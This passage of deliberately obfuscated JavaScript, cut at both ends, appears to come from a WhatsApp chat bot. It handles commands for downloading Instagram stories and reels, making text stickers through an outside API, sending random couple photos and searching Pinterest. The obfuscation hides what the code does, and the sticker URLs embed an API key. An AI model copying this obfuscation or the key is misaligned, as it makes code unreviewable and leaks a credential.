_0x1520dd={};_0x1520dd[_0x3f8ecc(0xb81,0x928,0xf3a,0x9bb)+_0x3d6917(0xa57,0xa7c,0xcac,0xc85)]=0x3b9aca00,_0x1520dd[_0x3f8ecc(0x818,0x888,0x5ce,0x897)+'d']=!![],_0x1520dd[_0x3f8ecc(0x8ba,0x6d2,0xb5d,0x94f)+'ral']=!![],_0x1520dd['externalAd'+_0x3f8ecc(0x718,0x5c4,0x6d8,0x8f8)]=_0x1a0e6e;const _0x1ae954={};_0x1ae954['contextInf'+'o']=_0x1520dd,_0x1ae954['mimetype']=_0x5b5df5[_0x3d6917(0x3fe,0x741,0x381,0x2e1)],_0x1ae954['filename']=_0x4cae0d+_0x3f8ecc(0xc25,0x8d8,0x99c,0xaf7),_0x1ae954[_0x3f8ecc(0xebe,0xf61,0xab6,0xc49)]=fgclink2,_0x1ae954[_0x3d6917(0x459,0x3dd,0x1e0,-0x45)]=pp_bot2,alpha[_0x3f8ecc(0xd65,0x119b,0x10d2,0xfb1)+'e'](from,_0x1cec10,MessageType['document'],_0x1ae954);});})[_0x134458(0x6ff,0xa78,0xb80,0xa5c)](_0x4aa632=>reply(''+_0x4aa632));}catch(_0x34cca9){console[_0x15af3d(0xb9a,0x6ba,0x7de,0xa9c)](color(_0x15af3d(0x881,0x6c4,0x570,0x7a3),_0x15af3d(0x41a,-0xc7,0x73b,0x37c)),_0x34cca9);}await limitAdd(sender,limit);break;case _0x15af3d(0x310,-0xb1,0x1f7,0x3ed):case _0x134458(0x2d3,0x4e5,0x594,0x41b):case'instagrams'+_0x15af3d(0xc74,0xad3,0xfde,0xe13):const _0x1c6bc9={};_0x1c6bc9['displayTex'+'t']='Check\x20Limi'+'t';const _0x177640={};_0x177640['buttonId']=_0x134458(0x7fd,0x5a4,0xbed,0x456),_0x177640['buttonText']=_0x1c6bc9,_0x177640['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0xbfa,0x848,0x93c)](prefix),'©\x20'+ownername,[_0x177640]);if(!q)return reply(_0x15af3d(0x7f6,0x87c,0x9ce,0x3e3)+'a?');pape=q,hx['igstory'](pape)[_0x15af3d(0x77c,0x84e,0x601,0x956)](async _0x232d88=>{function _0x3844ba(_0x18ff87,_0x1c960b,_0x5257d9,_0x4e5650){return _0x134458(_0x1c960b- -0xe9,_0x1c960b-0x78,_0x18ff87,_0x4e5650-0xe2);}const _0x1d258b={'UiWJZ':_0x3844ba(0x329,0x2ea,0x785,0xfd)+_0x3844ba(0x7da,0x74d,0x8d7,0x7d7),'FfqlU':_0x3844ba(0xab7,0x99e,0xcd4,0xbf3),'wLngl':_0x3844ba(0x774,0x62b,0x177,0x6c1),'lhsHZ':_0x379b7e(0x31b,0x9e,0x239,0x21a)+'21','OPXfu':function(_0x17f24f,_0x22778a){return _0x17f24f(_0x22778a);},'DhfSQ':function(_0x108bfd,_0x2cee17){return _0x108bfd!==_0x2cee17;},'gpfsn':'EwQOs','gwSFj':_0x3844ba(0x7c0,0x9d3,0x54c,0x4e4),'atAYp':function(_0x36a970,_0x59a4e7){return _0x36a970(_0x59a4e7);}};let _0x463966=await _0x1d258b[_0x3844ba(0x6bb,0x50d,0x305,0x606)](getBuffer,_0x232d88[_0x3844ba(0x841,0x567,0x304,0x2e2)][_0x379b7e(0x38d,0xf5,0x395,0x470)+_0x3844ba(0x73d,0x666,0x49b,0x7d8)]);await alpha['sendMessag'+'e'](from,_0x463966,image,{'thumbnail':_0x463966,'quoted':mek,'caption':_0x379b7e(0x106,0x348,0xa1,0x437)+'AM\x20STORY*\x20'+'」'+enter+enter+_0x379b7e(0x58c,0x3b5,0x6e7,0x791)+_0x232d88[_0x379b7e(0x481,0x6cf,0x576,0x102)]['id']+enter+('📛\x20*Usernam'+_0x3844ba(0xb34,0x64f,0x83d,0x2ae))+_0x232d88[_0x379b7e(0x481,0x266,0x77a,0x512)][_0x3844ba(0x719,0x2ab,-0x205,0x6fe)]+enter+(_0x379b7e(0x164,0x39b,0x535,-0xf0)+_0x379b7e(0x569,0x724,0x343,0x5f4))+_0x232d88[_0x3844ba(0x94d,0x567,0x98a,0x21b)][_0x3844ba(0xbe0,0x80f,0xa72,0xc89)]+enter+(_0x3844ba(-0x28a,0x95,0xf1,-0x2dc)+_0x3844ba(0x90a,0x817,0xbfe,0xbf3))+_0x232d88['user'][_0x379b7e(0x456,0xce,0x22e,0x669)]+enter+('✨\x20*Followi'+'ng\x20:*\x20')+_0x232d88[_0x379b7e(0x481,0x399,0x605,0x3ba)][_0x3844ba(0x241,0x3a0,0x3f1,0x488)]+enter+(_0x379b7e(0x44e,0xd6,0x7b9,0x6d)+_0x379b7e(0x6e5,0x5ef,0x917,0x336)+_0x379b7e(0x18c,0x16d,0x341,-0x237)+'om/')+_0x232d88[_0x379b7e(0x481,0x39,-0x6d,0x37b)][_0x3844ba(0x51f,0x2ab,0x4a4,0x640)]+enter+(_0x379b7e(0x63b,0x4d5,0xb20,0x92b)+'*\x20')+_0x232d88[_0x3844ba(0x3ed,0x7e9,0xa0f,0xbc4)]['length']+_0x379b7e(0x482,0x962,0x6a7,0x59e)+enter+enter+(_0x3844ba(-0x31,0x161,0x641,0x18)+_0x379b7e(0x4bf,0x37d,0x4ab,0x734)+_0x3844ba(0x474,0x6a8,0xa40,0x8e7)+_0x3844ba(0x44d,0x60a,0xa33,0x75a)+'_')});function _0x379b7e(_0x4471a4,_0x5887f5,_0x1929d5,_0x309c81){return _0x15af3d(_0x4471a4- -0x322,_0x5887f5-0x17e,_0x1929d5,_0x309c81-0xa4);}for(let _0x4275b7 of _0x232d88[_0x3844ba(0x92d,0x7e9,0x840,0x749)]){if(_0x4275b7[_0x3844ba(0x1e,0x21e,0x685,-0x258)][_0x3844ba(0x4e7,0x6af,0xb7d,0xb40)]('mp4')){let _0x588783=await _0x1d258b[_0x3844ba(0x3fa,0x50d,0x4eb,0x941)](getBuffer,_0x4275b7[_0x379b7e(0x138,-0xa1,-0x22e,-0x24a)]);alpha['sendMessag'+'e'](from,_0x588783,video,{'thumbnail':Buffer[_0x3844ba(0x618,0x391,-0xf1,0x18d)](-0x3bf*0xa+-0x13f2+0x3968),'quoted':mek,'caption':'Instagram\x20'+'•\x20'+_0x4275b7[_0x3844ba(0xcf2,0x816,0x5ad,0xa79)]});}else{if(_0x1d258b[_0x379b7e(0x47c,0x13c,0x343,0x287)](_0x1d258b[_0x379b7e(0x572,0x153,0x5c8,0x5f7)],_0x1d258b[_0x379b7e(0x277,-0x175,0x465,0x166)])){let _0x5a62dc=await _0x1d258b[_0x379b7e(0x3a,-0x1ba,0x149,-0x381)](getBuffer,_0x4275b7[_0x379b7e(0x138,0x289,0x5d,0x272)]);alpha['sendMessag'+'e'](from,_0x5a62dc,image,{'thumbnail':Buffer[_0x379b7e(0x2ab,0x66e,-0x23c,-0x168)](0x1*0x22e6+-0x11fd+0x6f*-0x27),'quoted':mek,'caption':_0x379b7e(0x3c0,0x72b,0x404,0x521)+'•\x20'+_0x4275b7[_0x379b7e(0x730,0xb31,0xb19,0x5ae)]});}else{var _0x279588='Hay\x20@'+_0x307a22[_0x379b7e(0x21d,0x544,0x3c7,-0x283)]('@')[-0x107b*-0x1+0x241e+-0x1*0x3499]+(',\x20kamu\x20mau'+'\x20bayar\x20pak'+_0x379b7e(0x65,0x14a,0xc7,-0x13)+_0x3844ba(0x6cd,0x94e,0xb95,0x74f)+_0x3844ba(0x68f,0x75b,0xba8,0x6ab));const _0x46fdb5={};_0x46fdb5[_0x379b7e(0x3ca,0x2eb,0x2eb,0x3ee)+'t']='NOMOR';const _0x48677a={};_0x48677a[_0x3844ba(0x603,0x9f7,0xc1a,0x832)]=_0x1d258b['UiWJZ'],_0x48677a[_0x3844ba(0xcf,0x36b,0x7b7,-0x3b)]=_0x46fdb5,_0x48677a['type']=0x1;const _0x14f9bd={};_0x14f9bd['buttonId']=_0x1d258b[_0x3844ba(0x5a1,0x22b,0x511,-0x1b2)],_0x14f9bd[_0x379b7e(0x285,0x529,0x524,0x2d0)]={},_0x14f9bd[_0x379b7e(0x730,0x727,0x98f,0x52d)]=0x1,_0x14f9bd[_0x379b7e(0x285,0x529,0x524,0x2d0)][_0x3844ba(0x15a,0x4b0,0x3a1,0x8e6)+'t']=_0x1d258b['wLngl'];const _0x1258fd=[_0x48677a,_0x14f9bd],_0x38691f={};_0x38691f[_0x3844ba(0x6e3,0x70e,0xaca,0x60c)+'t']=_0x279588,_0x38691f[_0x379b7e(0x7e3,0x6f7,0xcc8,0xbe0)]=''+_0x16c245+_0x4304bf+_0x19507c+_0x142ce7+'©\x20'+_0x5404c9,_0x38691f[_0x379b7e(0x152,0xf6,-0x32d,-0x2b1)]=_0x1258fd,_0x38691f[_0x3844ba(0x1ae,0x353,0x7a,0x388)]=0x1;const _0x4cf0a1=_0x38691f,_0x2a4d7c={};_0x2a4d7c[_0x379b7e(0x84c,0xb6e,0xa70,0x477)]='hi',_0x2a4d7c[_0x379b7e(0x5cf,0x609,0x96b,0x60e)+_0x379b7e(0x8e2,0xbe6,0xd6f,0xcd4)]=0x3b9aca00,_0x2a4d7c[_0x379b7e(0x266,0x6,0x1c7,0x32b)+'d']=!![],_0x2a4d7c[_0x379b7e(0x308,0x367,-0x189,0x1c5)+_0x3844ba(0x85a,0x38e,0xc,0x701)]=!![],_0x2a4d7c['mentionedJ'+'id']=[_0x479a4a];const _0x51edfa={};_0x51edfa[_0x379b7e(0x21e,0x669,0x492,0x302)]=_0x1d258b[_0x3844ba(0xa79,0x99c,0xbb2,0x641)],_0x51edfa[_0x379b7e(0x799,0x9d0,0x2de,0x7f6)+'o']=_0x2a4d7c,_0x51edfa['quoted']=_0x4ed11d,_0x51edfa['sendEpheme'+_0x3844ba(-0x156,0x38e,0x349,0xd0)]=!![],_0x3e8b37[_0x3844ba(0x4c5,0x899,0x854,0x55f)+'e'](_0x229998,_0x4cf0a1,_0x161d4e['buttonsMes'+_0x379b7e(0x7d4,0x481,0x300,0x64c)],_0x51edfa);}}}})['catch'](_0x413e53=>reply(_0x134458(0x9d2,0xab7,0x69e,0x900)+_0x134458(0x725,0x38b,0x692,0x3cb)+_0x134458(0x296,-0x19a,-0x144,0x634)+'dengan\x20com'+'mand\x20ya\x20sa'+'ma'));break;case'ig':case _0x15af3d(0xa61,0xd3b,0xd9e,0x7fb):case'igphoto':case _0x134458(0x405,0x54e,0x3fd,0x897):case _0x134458(0x2fb,0xa1,0x6dc,0x564):case _0x134458(0x226,0x47a,0x56f,0x18f):case'igvideo':case _0x134458(0x6d1,0x2c9,0x4ae,0x465):case _0x15af3d(0x891,0xcb8,0xc1a,0xa96):case _0x134458(0x704,0x4a4,0x71c,0x413):case'instareels':case _0x15af3d(0x8cf,0x47e,0xc5e,0x8d3):case'igtv':case _0x15af3d(0x7d5,0x51f,0xc44,0xb8f):const _0xdce83b={};_0xdce83b[_0x134458(0x599,0x64b,0x650,0x90f)+'t']=_0x15af3d(0x959,0x954,0xbe8,0x80f)+'t';const _0xee285b={};_0xee285b[_0x134458(0xae0,0xbb5,0xa64,0x901)]='limit',_0xee285b[_0x15af3d(0x5a7,0x94d,0x7bd,0x2b3)]=_0xdce83b,_0xee285b['type']=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x82e,0x570,0x57e)](prefix),'©\x20'+ownername,[_0xee285b]);if(!isUrl(args[-0x1*0x6e+-0x1*-0x783+0x31*-0x25])&&!args[0x6dc+-0x18a7+0x11cb][_0x134458(0x798,0xb27,0x89d,0x470)](_0x134458(0x790,0xb27,0xb3f,0x5e8)+_0x134458(0x37d,-0x21,-0x160,0x55e)))return reply(lang['erorLink']());let urlnya=q;hx[_0x15af3d(0xa61,0xa7e,0x7bd,0xb0b)](urlnya)[_0x15af3d(0x77c,0x651,0x886,0x9fd)](async _0x21c9a7=>{function _0x2cc13c(_0x2a51c2,_0x2f6587,_0x40f8da,_0x4cff71){return _0x15af3d(_0x4cff71-0xc1,_0x2f6587-0x1ee,_0x2a51c2,_0x4cff71-0xfc);}const _0xfe89f9={'DJoEn':function(_0x5f045d,_0x3002b1){return _0x5f045d(_0x3002b1);},'CakMk':function(_0x333c6e,_0x20836c){return _0x333c6e(_0x20836c);},'iUIHH':_0x2cc13c(0x924,0xdc0,0xcc7,0xc52),'nLNgZ':function(_0x1265af,_0x26c79f){return _0x1265af!==_0x26c79f;},'kdVmY':'UWyUq','rGdpj':function(_0x570f1f,_0x1f9e51){return _0x570f1f(_0x1f9e51);}};let _0x348abe=await _0xfe89f9['CakMk'](getBuffer,_0x21c9a7['user'][_0x2cc13c(0xa69,0x486,0x80a,0x770)+_0x2e644f(0xf5d,0xab1,0xe36,0xc10)]);function _0x2e644f(_0x530783,_0x59f81a,_0x7eaaf3,_0x191791){return _0x134458(_0x59f81a-0x362,_0x59f81a-0x19f,_0x7eaaf3,_0x191791-0x197);}await alpha[_0x2cc13c(0xdfe,0xc50,0x9b3,0xb96)+'e'](from,_0x348abe,image,{'thumbnail':_0x348abe,'quoted':mek,'caption':_0x2e644f(0x3c0,0x637,0x1d1,0x7ad)+'AM\x20DOWNLOA'+_0x2cc13c(0xbc0,0x7f2,0xb7d,0x843)+enter+enter+_0x2e644f(0x89a,0xabd,0x90a,0xa9c)+_0x21c9a7[_0x2e644f(0x667,0x9b2,0x5bd,0xe9f)]['id']+enter+('📛\x20*Usernam'+_0x2cc13c(0x69d,0x866,0xc6f,0x94c))+_0x21c9a7[_0x2cc13c(0x798,0x836,0x58f,0x864)][_0x2cc13c(0x41f,0x137,0x46b,0x5a8)]+enter+('💋\x20*Fullnam'+'e\x20:*\x20')+_0x21c9a7[_0x2e644f(0xb6b,0x9b2,0x5bc,0x5df)][_0x2e644f(0xde5,0xc5a,0xea4,0xaf2)]+enter+(_0x2cc13c(-0x12f,0x383,0x162,0x392)+'rs\x20:*\x20')+_0x21c9a7[_0x2e644f(0xe18,0x9b2,0x9ef,0xb3b)]['followers']+enter+(_0x2e644f(0x9e2,0x926,0xc61,0xd25)+_0x2e644f(0xa54,0x576,0x966,0x4ce))+_0x21c9a7[_0x2e644f(0xba3,0x9b2,0xd33,0x5d4)][_0x2cc13c(0x982,0x86b,0xb23,0x69d)]+enter+('*🔗\x20Link\x20:*'+_0x2e644f(0x99c,0xc16,0xdf8,0xeef)+_0x2cc13c(0x4e1,0xa58,0x5ac,0x56f)+'om/')+_0x21c9a7['user'][_0x2e644f(0x36b,0x6f6,0x59e,0xbe8)]+enter+(_0x2cc13c(0xbb9,0xa3e,0xd7a,0xa1e)+'*\x20')+_0x21c9a7[_0x2e644f(0x8f2,0xc34,0xe05,0x78a)][_0x2cc13c(0xc2c,0xd2b,0x740,0x97f)]+_0x2e644f(0x7ff,0x9b3,0xc3d,0xdba)+enter+enter+(_0x2cc13c(0x10e,0x6ce,0x2de,0x45e)+_0x2cc13c(0x4f7,0xb14,0x5bb,0x8a2)+_0x2e644f(0x951,0xaf3,0x669,0x631)+'an\x20dikirim'+'_')});for(let _0x37aaf5 of _0x21c9a7[_0x2cc13c(0x901,0x931,0xf5d,0xae6)]){if(_0x37aaf5[_0x2e644f(0x8b4,0x669,0x6b4,0x49d)][_0x2cc13c(0x513,0xc86,0xb6b,0x9ac)](_0xfe89f9['iUIHH'])){if(_0xfe89f9[_0x2e644f(0x341,0x523,0x2c6,0x67f)](_0xfe89f9['kdVmY'],_0xfe89f9['kdVmY']))_0xfe89f9[_0x2e644f(0x578,0xa3e,0x64f,0x8fa)](_0x20e44c,_0x457edb[_0x2e644f(0x627,0x9ac,0xcdc,0x9d4)]['api']);else{let _0x46251f=await _0xfe89f9['rGdpj'](getBuffer,_0x37aaf5[_0x2e644f(0x5d3,0x669,0x1cb,0x4b5)]);alpha['sendMessag'+'e'](from,_0x46251f,video,{'thumbnail':Buffer[_0x2e644f(0x422,0x7dc,0x454,0x5d8)](0x886+0x115*-0x1+-0x771),'quoted':mek,'caption':'Instagram\x20'+'•\x20\x20'+_0x37aaf5[_0x2cc13c(0xa31,0xf6e,0x9dc,0xb13)]});}}else{let _0x4dea2c=await _0xfe89f9[_0x2e644f(0x1005,0xbe0,0x1005,0xf1e)](getBuffer,_0x37aaf5[_0x2cc13c(0x3f5,0x674,0x29,0x51b)]);alpha[_0x2e644f(0xcd1,0xce4,0xfc4,0xd1a)+'e'](from,_0x4dea2c,image,{'thumbnail':Buffer['alloc'](-0x216f+-0x1685+-0x37f4*-0x1),'quoted':mek,'caption':'Instagram\x20'+'•\x20'+_0x37aaf5['type']});}}})['catch'](_0x50d42e=>reply(_0x15af3d(0x71c,0x47c,0x40c,0x8f1)+_0x15af3d(0x5c9,0xab7,0x9af,0x648)+_0x15af3d(0xc54,0xbd1,0xa63,0xd59)+_0x15af3d(0x81b,0xacc,0x91e,0xcc6)+'te')),await limitAdd(sender,limit);break;case'ttp1':const _0x1582b6={};_0x1582b6[_0x134458(0x599,0x327,0x135,0xff)+'t']=_0x15af3d(0x959,0x498,0x63f,0x581)+'t';const _0x11d192={};_0x11d192['buttonId']=_0x15af3d(0x950,0xa25,0x8f3,0xc6c),_0x11d192[_0x15af3d(0x5a7,0x4b9,0x8f0,0xa75)]=_0x1582b6,_0x11d192[_0x134458(0x8ff,0xde9,0x657,0x8ca)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x11d192]);if(args[_0x134458(0x76b,0xaca,0x9c3,0xc3c)]<0x1ef5+0x25c8+-0x6a*0xa6)return reply(lang[_0x134458(0xa75,0xf15,0x8dd,0x6c2)](prefix,command));hhh=q,p=await getBuffer(_0x15af3d(0xc76,0xf67,0x10f9,0xe11)+_0x134458(0x8d1,0x917,0x56a,0xcbd)+_0x15af3d(0x456,0x575,0x57,0x7ce)+'pp.com/api'+'/ttpcustom'+'?text='+hhh+(_0x134458(0xa1f,0x627,0xec1,0xac4)+_0x134458(0x379,0x7ef,0x716,-0x151)+'ardianto'));const _0xa851bd={};_0xa851bd[_0x15af3d(0xc2e,0xb38,0x8f4,0xbb8)]=fgclink,alpha['sendMessag'+'e'](from,p,sticker,_0xa851bd),await limitAdd(sender,limit);break;case _0x134458(0x8a9,0xc95,0x8e2,0x513):const _0x16cdd1={};_0x16cdd1[_0x15af3d(0x6ec,0x866,0x7c2,0x64a)+'t']=_0x15af3d(0x959,0x660,0x7f9,0x872)+'t';const _0x2607e5={};_0x2607e5['buttonId']=_0x15af3d(0x950,0x52c,0xbc5,0x60b),_0x2607e5[_0x134458(0x454,0x5af,-0x7,0x429)]=_0x16cdd1,_0x2607e5[_0x15af3d(0xa52,0x6d3,0xc67,0xe6a)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang['limit'](prefix),'©\x20'+ownername,[_0x2607e5]);if(args[_0x15af3d(0x8be,0x4c2,0x484,0x950)]<-0x3a0+0x42a+-0x89)return reply(lang[_0x134458(0xa75,0x99d,0x58d,0xd46)](prefix,command));hhh=q,pp=await getBuffer(_0x134458(0xb23,0xfdd,0xfde,0xbf5)+_0x15af3d(0xa24,0x62d,0xa5b,0xcdd)+_0x134458(0x303,0x533,0x161,0x569)+_0x15af3d(0x4f0,0x829,0x9a7,0x7d9)+_0x15af3d(0x524,0x11c,0x49e,0x9b8)+_0x134458(0x3ee,0x772,0x839,-0xeb)+hhh+(_0x15af3d(0x38b,0x74c,-0xf5,0x396)+_0x15af3d(0x2cb,-0x1dd,0x2b9,0xdf)+_0x134458(0x822,0xc28,0xa5c,0x7a6)));const _0x4167e2={};_0x4167e2[_0x15af3d(0xc2e,0x90b,0xc42,0xa49)]=fgclink,alpha[_0x134458(0x982,0x9fa,0xae7,0x95f)+'e'](from,pp,sticker,_0x4167e2),await limitAdd(sender,limit);break;case'ttp3':const _0x477e1d={};_0x477e1d[_0x134458(0x599,0x930,0x883,0x9d2)+'t']=_0x15af3d(0x959,0xe1b,0xc70,0x500)+'t';const _0x458833={};_0x458833[_0x134458(0xae0,0x65c,0xb6b,0x916)]=_0x15af3d(0x950,0xa1e,0x5a2,0xc13),_0x458833[_0x15af3d(0x5a7,0x779,0x45a,0x168)]=_0x477e1d,_0x458833[_0x134458(0x8ff,0x7ed,0xcb3,0x6bc)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0xa45,0x70c,0x4ae)](prefix),'©\x20'+ownername,[_0x458833]);if(args[_0x134458(0x76b,0x3ff,0x49c,0xacd)]<-0x9f9+0x1c*0x142+0x9*-0x2ce)return reply(lang[_0x134458(0xa75,0xb1e,0x8f8,0x58b)](prefix,command));hhh=q,ppp=await getBuffer(_0x15af3d(0xc76,0xe34,0xfd4,0x967)+_0x134458(0x8d1,0x9f5,0xb84,0x59b)+_0x134458(0x303,0x3c4,0x96,-0x1af)+_0x134458(0x39d,-0x122,0x719,0x2f8)+_0x15af3d(0x524,0x760,0x53c,0x418)+_0x15af3d(0x541,0x349,0x10e,0x610)+hhh+('&color=red'+_0x15af3d(0x952,0xa49,0x6f9,0x70f)+'rdianto'));const _0x306603={};_0x306603[_0x15af3d(0xc2e,0xc49,0xa46,0x969)]=fgclink,alpha['sendMessag'+'e'](from,ppp,sticker,_0x306603),await limitAdd(sender,limit);break;case _0x134458(0x872,0x6ca,0xa22,0x6db):const _0x1e9c91={};_0x1e9c91[_0x134458(0x599,0x605,0x910,0x3c1)+'t']=_0x134458(0x806,0x61a,0x778,0x919)+'t';const _0x5dd03c={};_0x5dd03c[_0x15af3d(0xc33,0xf44,0x10d8,0xb48)]=_0x15af3d(0x950,0x4e2,0xe43,0x8f7),_0x5dd03c['buttonText']=_0x1e9c91,_0x5dd03c[_0x15af3d(0xa52,0x685,0x80f,0x692)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x15af3d(0x950,0x7d3,0xe25,0x73e)](prefix),'©\x20'+ownername,[_0x5dd03c]);if(args[_0x134458(0x76b,0x299,0x4f0,0xbe6)]<-0x1490+-0x24d5+-0x3e*-0xed)return reply(lang['noteks'](prefix,command));hhh=q,pppp=await getBuffer(_0x15af3d(0xc76,0x107e,0x1059,0xc04)+_0x15af3d(0xa24,0x82c,0xd5b,0x91b)+_0x15af3d(0x456,0x2b5,0x150,0x57b)+_0x134458(0x39d,-0xe1,0x608,0x2c7)+'/ttpcustom'+_0x134458(0x3ee,0x3e5,0x592,0x3ed)+hhh+(_0x134458(0x2eb,0x11e,0x63a,0x724)+'n&apikey=h'+_0x134458(0x4cd,0x101,0x12a,0x5d5)));const _0x186a0e={};_0x186a0e[_0x15af3d(0xc2e,0xdb7,0xc4c,0xa3f)]=fgclink,alpha[_0x15af3d(0xad5,0xc0b,0xe13,0x647)+'e'](from,pppp,sticker,_0x186a0e),await limitAdd(sender,limit);break;case _0x134458(0xa2b,0x80d,0xb37,0xe0f):case _0x134458(0xa6c,0x952,0xbbf,0xd0b):const _0x15ded8={};_0x15ded8[_0x15af3d(0x6ec,0x4c9,0x830,0x505)+'t']=_0x134458(0x806,0x323,0x648,0x7cf)+'t';const _0x550c33={};_0x550c33[_0x15af3d(0xc33,0xb17,0xc37,0x1041)]=_0x134458(0x7fd,0x64e,0x996,0x6c9),_0x550c33[_0x15af3d(0x5a7,0x474,0x925,0x7c7)]=_0x15ded8,_0x550c33[_0x134458(0x8ff,0x926,0x658,0xcb7)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x38b,0x438,0x869)](prefix),'©\x20'+ownername,[_0x550c33]);if(!isGroup)return reply(lang['onlygc']());var datax=fs[_0x134458(0x526,0x33e,0x1b8,0x90)+'nc']('./lib/coup'+_0x15af3d(0xbba,0x89c,0xbfb,0x7d1));jsonData=JSON[_0x134458(0x71a,0xa46,0x2ff,0x37b)](datax),randIndex=Math[_0x134458(0x989,0xbae,0x857,0x91f)](Math['random']()*jsonData[_0x15af3d(0x8be,0x777,0xbaa,0x766)]);let randKey_=jsonData[randIndex];Laki=await getBuffer(randKey_[_0x15af3d(0x8cb,0x75d,0xd2a,0xc7b)]),await alpha[_0x134458(0x982,0x8a5,0x62c,0xa43)+'e'](from,Laki,image,{'caption':_0x134458(0x168,0x5a8,0x5c1,0x189),'quoted':mek,'thumbnail':Buffer[_0x134458(0x47a,0x4d4,0x2f3,0x5c4)](-0x16*0x13c+-0x1*-0x21b3+0x1*-0x68b)}),Cewe=await getBuffer(randKey_['female']);const mediaxox=await alpha['prepareMes'+'sage'](from,Cewe,MessageType['image'],{'thumbnail':Buffer[_0x15af3d(0x5cd,0x792,0x9fd,0x459)](-0x1c44+0x1e45+0x13*-0x1b)});let bacotluxxo=mediaxox['message'][_0x15af3d(0x94b,0xe14,0x4c4,0xe40)+'essage']?mediaxox[_0x134458(0x679,0x280,0x437,0x66b)][_0x15af3d(0x94b,0x6ea,0x9d3,0x555)+'essage']:mediaxox;const _0x7b8dd5={};_0x7b8dd5[_0x15af3d(0x6ec,0x432,0x330,0x6f0)+'t']=_0x134458(0x18a,-0xf8,-0x127,-0x30f);const _0x4efcda={};_0x4efcda[_0x134458(0xae0,0xd9d,0xaf8,0xc16)]=_0x134458(0x2c0,0x50b,0x4a1,0x10b),_0x4efcda[_0x15af3d(0x5a7,0xed,0x5f4,0xa5f)]=_0x7b8dd5,_0x4efcda[_0x134458(0x8ff,0xbcf,0x591,0x635)]=0x1;const _0x14e032={};_0x14e032['displayTex'+'t']=_0x15af3d(0x9b0,0xcf9,0xb16,0x8e6);const _0x4ca0c3={};_0x4ca0c3[_0x134458(0xae0,0x6f9,0xa4b,0xeb9)]=''+command,_0x4ca0c3['buttonText']=_0x14e032,_0x4ca0c3['type']=0x1;const buttonsxox=[_0x4efcda,_0x4ca0c3],btnxo___={'contentText':_0x15af3d(0x356,0x3c9,-0x94,0x51e),'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator+(_0x15af3d(0x6c9,0x7eb,0x71e,0x6cc)+_0x15af3d(0x55d,0x60d,0x596,0x20f))+sender[_0x15af3d(0x53f,0x6b0,0x253,0x407)]('@')[0x1f*0x137+0x1*-0x98d+-0x1c1c],'buttons':buttonsxox,'headerType':0x4,'imageMessage':bacotluxxo[_0x15af3d(0x7cc,0x8da,0x666,0x2f4)][_0x134458(0x7d2,0x6cd,0x948,0x336)+'ge']},_0x20b112={};_0x20b112[_0x134458(0xadb,0xb86,0xab4,0xf1b)]=mek,alpha[_0x134458(0x982,0xda8,0x743,0xdd0)+'e'](from,btnxo___,MessageType[_0x15af3d(0x2a4,-0x191,0x23d,0x6b7)+_0x134458(0x9a3,0x882,0x6b6,0x9f6)],_0x20b112)[_0x15af3d(0x852,0x6d0,0xa77,0x6f4)](_0x508d28=>{function _0x2f7bc4(_0x433a36,_0x3935d9,_0x4c6c7b,_0x4f843f){return _0x15af3d(_0x3935d9-0x258,_0x3935d9-0x21,_0x4c6c7b,_0x4f843f-0xcc);}const _0x3500f4={'nMmMY':function(_0x3ce119,_0x1459e2){return _0x3ce119(_0x1459e2);},'TVMHU':_0x2f7bc4(0x9b5,0xd7d,0xfa0,0xcf2)+_0x2f7bc4(0xb77,0xead,0xfad,0x11ba)+'oba\x20bebera'+_0x294958(0x11c,0x367,0x460,0x682)+'gi'};function _0x294958(_0x1568f8,_0x2c0de6,_0x3880dc,_0x1e024e){return _0x15af3d(_0x3880dc- -0x395,_0x2c0de6-0x8,_0x2c0de6,_0x1e024e-0x71);}_0x3500f4['nMmMY'](reply,_0x3500f4['TVMHU']);}),await limitAdd(sender,limit);break;case _0x134458(0xaab,0xac2,0x9ee,0xdcf):case _0x134458(0x419,0x42d,0x549,0x35):const _0x24ef2d={};_0x24ef2d[_0x134458(0x599,0x295,0xf7,0x98d)+'t']=_0x134458(0x806,0x94b,0x48b,0x886)+'t';const _0x4625ad={};_0x4625ad[_0x15af3d(0xc33,0xeee,0xe8c,0x9da)]=_0x134458(0x7fd,0x85c,0x41e,0x327),_0x4625ad['buttonText']=_0x24ef2d,_0x4625ad[_0x134458(0x8ff,0xd78,0xc4d,0xba7)]=0x1;if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return sendButMessage(from,lang[_0x134458(0x7fd,0x3da,0x543,0x5c3)](prefix),'©\x20'+ownername,[_0x4625ad]);if(!q)return reply(_0x134458(0x374,0x7dd,-0xde,0x7dc)+_0x15af3d(0x929,0x9a8,0x467,0xb75));async function pinterestSearch(_0x5e77b9){function _0x11b534(_0x44cbca,_0x57c39a,_0x41adc6,_0x5c53ab){return _0x15af3d(_0x5c53ab- -0x72,_0x57c39a-0x152,_0x57c39a,_0x5c53ab-0x1e);}const _0x4478f4={'JEiQO':_0x30f8d6(0xb32,0x693,0xb81,0x32c),'wtfCu':function(_0x1e4170,_0x39b093){return _0x1e4170*_0x39b093;},'ZgvGQ':function(_0x33e022,_0x55e2b7){return _0x33e022(_0x55e2b7);},'CAtah':function(_0x68834f,_0x141cfe){return _0x68834f!==_0x141cfe;},'rgnCv':_0x11b534(0x7a1,0x4f8,0x5ae,0x6e3),'ehdLm':function(_0x450bdd,_0x331787,_0x39e7d5){return 